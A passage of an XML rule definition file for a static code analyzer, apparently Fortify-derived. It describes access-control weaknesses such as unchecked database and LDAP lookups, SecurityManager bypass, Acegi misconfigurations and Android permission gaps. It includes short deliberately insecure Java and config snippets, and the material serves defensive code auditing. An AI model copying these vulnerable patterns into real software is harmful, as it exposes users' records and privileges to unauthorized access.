																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_database</key>
		<internalKey>Security Features/Access Control/Database</internalKey>
		<name>Access Control: Database</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Database access control errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br><br>2.	The data is used to specify the value of a primary key in a SQL query.<br><br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.<br><br><pre><br>...<br>id = Integer.decode(request.getParameter("invoiceID"));<br>String query = "SELECT * FROM invoices WHERE id = ?";<br>PreparedStatement stmt = conn.prepareStatement(query);<br>stmt.setInt(1, id);<br>ResultSet results = stmt.execute();<br>...<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 2:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        String id = this.getIntent().getExtras().getString("invoiceID");<br>        String query = "SELECT * FROM invoices WHERE id = ?";<br>        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);<br>        Cursor c = db.rawQuery(query, new Object[]{id});<br>...<br></pre><br><br>A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 566</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_ldap</key>
		<internalKey>Security Features/Access Control/LDAP</internalKey>
		<name>Access Control: LDAP</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing an LDAP statement that contains a user-controlled value can allow an attacker to access unauthorized directory entries.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Database access control errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>2.	The data is used to specify a data value in an LDAP query.<br><br><b>Example 1:</b> The employee ID of the current authenticated user is automatically submitted with each request by the client-side interface. The following code properly validates an employee ID as an integer before using it to construct an LDAP query. This validation prevents LDAP injection vulnerabilities, but may still leave the code vulnerable.<br><br><pre><br>...<br>env.put(Context.SECURITY_AUTHENTICATION, "none");<br>DirContext ctx = new InitialDirContext(env);<br><br>String empID = request.getParameter("empID");<br><br>try<br>{<br>  int id = Integer.parseInt(empID);<br><br>  BasicAttribute attr = new BasicAttribute("empID", empID);<br><br>  NamingEnumeration employee =<br>            ctx.search("ou=People,dc=example,dc=com",attr);<br>...<br><br></pre><br><br>The problem is that the developer has failed to consider what would happen if an attacker provides alternate values of <code>empID</code>. Although the interface automatically submits the employee ID of the current user, an attacker could submit an alternative value as part of a malicious request. Because the code in this example executes the query under an anonymous bind, it will return the directory entry for any valid employee ID, regardless of the identity of the current authenticated user.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 639</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_securitymanager_bypass</key>
		<internalKey>Security Features/Access Control/SecurityManager Bypass
		</internalKey>
		<name>Access Control: SecurityManager Bypass</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Invoking this function on untrusted code can allow attackers access to restricted packages and the ability to execute arbitrary code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Java APIs that perform tasks using the immediate caller's class loader instance should be used with caution. These APIs bypass the SecurityManager check that ensures all callers in the execution chain have been granted the requisite security permission. These APIs should not be invoked on behalf of untrusted code, as they can compromise system security.<br><br>  1.	Data enters a program from an untrusted source.<br>  <br><br>  2.	Sensitive APIs that performs tasks using the immediate caller's class loader instance are invoked on behalf of untrusted code.<br>  <br><br>The untrusted code is now able to override its own class loader permissions and access restricted resources using the immediate caller's permissions.<br><br> 
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A7 Missing Function Level Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[3]  <em>CVE 2012-1682</em> <br></p>
																									   <p>[4]  <em>CVE 2012-4681</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[7]  <em>Secure Coding Guidelines for the Java Programming Language, Version 4.0</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_weak_security_constraint</key>
		<internalKey>Security Features/Access Control/Weak Security Constraint
		</internalKey>
		<name>Access Control: Weak Security Constraint</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Weak security constraints do not provide adequate protection for security-critical resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  <br><br>A single <code>&lt;security constraint&gt;</code> element suggests the program does not employ role-based access control, which is commonly accepted best practice for protecting sensitive operations in secure web applications. If the application provides access to sensitive operations or data, there might not be sufficient controls in place to prevent unauthorized users from gaining access. Furthermore, if there is a wildcard (*) in the <code>&lt;url-pattern&gt;</code>, it can be an indication that the pattern is overly broad.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A7 Missing Function Level Access Control</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A8 Failure to Restrict URL Access</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3470.1 CAT II, APP3470.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3470.1 CAT II, APP3470.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3470.1 CAT II, APP3470.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3470.1 CAT II, APP3470.4 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3470.1 CAT II, APP3470.4 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.5, Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_acegi_misconfiguration_insecure_channel_mixing
		</key>
		<internalKey>Security Features/Acegi Misconfiguration/Insecure Channel
			Mixing
		</internalKey>
		<name>Acegi Misconfiguration: Insecure Channel Mixing</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing users jump between HTTP and HTTPS leaves the application vulnerable to session hijacking.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many applications use cookies to communicate a user's session identifier. When the application is accessed over HTTPS, cookies are protected (attackers are unable to sniff them). But if developers allow HTTP access to non-sensitive parts of the application, the session identifier can be stolen. When a user browses to an unprotected part of the site, the cookie, containing the session ID, is sent in the clear. If attackers sniff the traffic, they can see the session ID and use it to take control of the user's session.<br><br><br>The following example shows a configuration that mixes insecure and secure channels:<br><pre><br>  &lt;property name="filterInvocationDefinitionSource"&gt;<br>    &lt;value&gt;<br>      CONVERT_URL_TO_LOWERCASE_BEFORE_COMPARISON<br>      \A/secure/.*\Z=REQUIRES_SECURE_CHANNEL<br>      \A/acegilogin.jsp.*\Z=REQUIRES_SECURE_CHANNEL<br>      \A/j_acegi_security_check.*\Z=REQUIRES_SECURE_CHANNEL<br>      \A.*\Z=REQUIRES_INSECURE_CHANNEL<br>    &lt;/value&gt;<br>  &lt;/property&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Ben Alex <em>Acegi Security - Channel Security</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 5</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_acegi_misconfiguration_run_as_authentication_replacement
		</key>
		<internalKey>Security Features/Acegi Misconfiguration/Run-As
			Authentication Replacement
		</internalKey>
		<name>Acegi Misconfiguration: Run-As Authentication Replacement</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using the Run-As authentication replacement feature in Acegi can lead to a privilege escalation vulnerability.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Acegi Security allows for temporarily replacing the Authentication object in the SecurityContext during the secure object callback phase. This only occurs if the original Authentication object was successfully processed by the AuthenticationManager and AccessDecisionManager. The RunAsManager creates this Authentication object.<br>Typically developers use RunAsManager to configure one or more additional roles for an authenticated user for the duration of a method invocation. This is useful for a secure bean that needs to access a remote application. Since the remote application might demand different credentials, this allows translating between calling roles and those needed by the remote application so that the remote access can succeed. The new Authentication object (called RunAsUserToken) will be simply accepted as a valid Authentication object without any further authentication or authorization check.<br>Adding new roles or privileges to the new Authentication object has the potential to temporarily elevate the user's privileges, allowing the user to take an unauthorized action.<br>The following configuration shows using RunAsManager to add the role "UBER_BOSS" to a user who has the role "ROLE_PEON", thus temporarily elevating this user to have manager privileges, which enables all peons to get data from the PrivateCatalog.<br><br>&lt;bean id="bankManagerSecurity" class="org.acegisecurity.intercept.method.aopalliance.MethodSecurityInterceptor"&gt;<br>...<br> &lt;property name="objectDefinitionSource"&gt;<br>   &lt;value><br>     com.example.service.PrivateCatalog.getData=ROLE_PEON,RUN_AS_UBER_BOSS<br>...<br>   &lt;/value&gt;<br> &lt;/property&gt;<br>&lt;/bean&gt;
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Ben Alex <em>Acegi Security - Run-As Authentication Replacement</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 724</em> <br></p>
																									   <p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_application_permission_defined
		</key>
		<internalKey>Security Features/Android Bad Practices/Application
			Permission Defined
		</internalKey>
		<name>Android Bad Practices: Application Permission Defined</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program explicitly sets permission at the application level.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Only applications defined by this permission can access the components of this application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_just_provider_writepermission_defined
		</key>
		<internalKey>Security Features/Android Bad Practices/Just Provider
			writePermission Defined
		</internalKey>
		<name>Android Bad Practices: Just Provider writePermission Defined
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program declares a content provider with only the <code>writePermission</code> defined.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  While it is a good idea to define separate read and write permissions for content providers, defining only the <code>writePermission</code> could be misleading. Due to the nature of SQL, generating true write-only queries is generally impossible: even when the user does not have direct access to the data, an attacker can reconstruct the stored data by manipulating the <code>where</code> clause.<br><br><b>Example:</b> Below is an example of a content provider declared with only the <code>writePermission</code>.<br><br><pre> &lt;provider android:name=".ContentProvider" android:writePermission="content.permission.WRITE_CONTENT"/&gt; </pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[12] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15]  <em>Path Permission Element</em> <br></p>
																									   <p>[16]  <em>Provider Element</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[20]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_missing_broadcaster_permission
		</key>
		<internalKey>Security Features/Android Bad Practices/Missing
			Broadcaster Permission
		</internalKey>
		<name>Android Bad Practices: Missing Broadcaster Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program registers a receiver without specifying the broadcaster permission.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Receiver registered without the broadcaster permission will receive messages from any broadcaster. If these messages contain malicious data or come from a malicious broadcaster, the application may be compromised.<br><br><b>Example 1:</b> The following code registers a receiver without specifying the broadcaster permission.<br><pre><br>...<br>context.registerReceiver(broadcastReceiver, intentFilter);<br>...<br></pre>
